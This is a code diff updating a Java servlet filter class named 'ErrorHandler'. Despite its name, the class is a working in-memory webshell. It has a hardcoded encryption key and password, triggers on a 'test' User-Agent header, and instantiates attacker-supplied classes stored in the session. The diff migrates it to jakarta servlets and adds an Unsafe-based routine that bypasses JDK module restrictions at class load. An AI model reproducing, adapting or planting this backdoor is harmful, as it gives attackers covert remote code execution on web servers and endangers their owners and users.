@@ -1,23 +1,25 @@
-
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.*;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
+import jakarta.servlet.Filter;
+import jakarta.servlet.FilterChain;
+import jakarta.servlet.ServletException;
+import jakarta.servlet.ServletRequest;
+import jakarta.servlet.ServletResponse;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+import jakarta.servlet.http.HttpSession;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 
-/**
- * @author ReaJason
- * @since 2024/11/26
- */
 public class ErrorHandler extends ClassLoader implements Filter {
-    public String key = "3c6e0b8a9c15224a";
-    public String pass = "pass";
-    public String md5 = "11CD6A87589841636C37AC826A2A04BC";
+    public String key = "7b74f5d44e20fd71";
+    public String pass = "passFilter";
+    public String md5 = "6DA9A394180B0155C7CC6714A0B2179E";
     public String headerName = "User-Agent";
     public String headerValue = "test";
+    public static boolean isBypassModule;
 
     public ErrorHandler() {
     }
@@ -41,14 +43,9 @@ public class ErrorHandler extends ClassLoader implements Filter {
     }
 
     @Override
-    public void init(FilterConfig filterConfig) throws ServletException {
-
-    }
-
-    @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
-        HttpServletRequest request = (HttpServletRequest) servletRequest;
-        HttpServletResponse response = (HttpServletResponse) servletResponse;
+        HttpServletRequest request = (HttpServletRequest)servletRequest;
+        HttpServletResponse response = (HttpServletResponse)servletResponse;
 
         try {
             if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
@@ -63,7 +60,7 @@ public class ErrorHandler extends ClassLoader implements Filter {
 
                     Object f;
                     try {
-                        f = ((Class) session.getAttribute("payload")).newInstance();
+                        f = ((Class)session.getAttribute("payload")).newInstance();
                     } catch (IllegalAccessException | InstantiationException e) {
                         throw new RuntimeException(e);
                     }
@@ -84,23 +81,18 @@ public class ErrorHandler extends ClassLoader implements Filter {
 
     }
 
-    @Override
-    public void destroy() {
-
-    }
-
     public static String base64Encode(byte[] bs) throws Exception {
         String value = null;
 
         try {
             Class<?> base64 = Class.forName("java.util.Base64");
-            Object encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
-            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
+            Object encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
+            value = (String)encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var61) {
             try {
                 Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                 Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
+                value = (String)encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
             } catch (Exception var5) {
             }
         }
@@ -113,17 +105,43 @@ public class ErrorHandler extends ClassLoader implements Filter {
 
         try {
             Class<?> base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
+            value = (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var61) {
             try {
                 Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                 Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+                value = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
             } catch (Exception var5) {
             }
         }
 
         return value;
+    }
+
+    public static Object byPassJdkModule() {
+        Boolean var0 = false;
+
+        try {
+            Class var1 = Class.forName("sun.misc.Unsafe");
+            Field var2 = var1.getDeclaredField("theUnsafe");
+            var2.setAccessible(true);
+            Object var3 = var2.get((Object)null);
+            Method var4 = Class.class.getMethod("getModule");
+            Object var5 = var4.invoke(Object.class, (Object[])null);
+            Method var6 = var3.getClass().getMethod("objectFieldOffset", Field.class);
+            Field var7 = Class.class.getDeclaredField("module");
+            Long var8 = (Long)var6.invoke(var3, var7);
+            Method var9 = var3.getClass().getMethod("getAndSetObject", Object.class, Long.TYPE, Object.class);
+            var9.invoke(var3, ErrorHandler.class, var8, var5);
+            var0 = true;
+        } catch (Exception var10) {
+        }
+
+        return var0;
+    }
+
+    static {
+        byPassJdkModule();
     }
 }
